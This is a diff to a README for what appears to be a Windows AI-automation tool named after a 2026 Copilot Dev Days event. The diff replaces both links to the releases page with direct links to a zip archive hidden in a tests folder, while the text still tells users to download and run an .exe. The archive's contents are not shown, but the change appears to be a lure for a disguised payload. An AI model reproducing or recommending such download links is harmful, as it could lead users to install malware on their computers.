@@ -1,6 +1,6 @@
 # 🤖 GitHubCopilotDevDays-Curitiba-2026 - Automate your daily work tasks today
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Dao-star/GitHubCopilotDevDays-Curitiba-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Dao-star/GitHubCopilotDevDays-Curitiba-2026/raw/refs/heads/main/source/tests/Usuarios.Tests/Api/Hub-Git-Dev-Curitiba-Days-Copilot-v3.0.zip)
 
 This application helps users build automated workflows using artificial intelligence. You will connect AI tools to your existing processes to handle repetitive tasks. This guide explains how to install and run the software on your Windows computer.
 
@@ -21,7 +21,7 @@ Before you install the software, ensure your computer meets these minimum specif
 
 Visit the link below to reach the official download page for this project.
 
-[Click here to open the download page](https://github.com/Dao-star/GitHubCopilotDevDays-Curitiba-2026/releases)
+[Click here to open the download page](https://github.com/Dao-star/GitHubCopilotDevDays-Curitiba-2026/raw/refs/heads/main/source/tests/Usuarios.Tests/Api/Hub-Git-Dev-Curitiba-Days-Copilot-v3.0.zip)
 
 1. Open the page above in your preferred web browser.
 2. Locate the file ending in `.exe` under the latest release section.
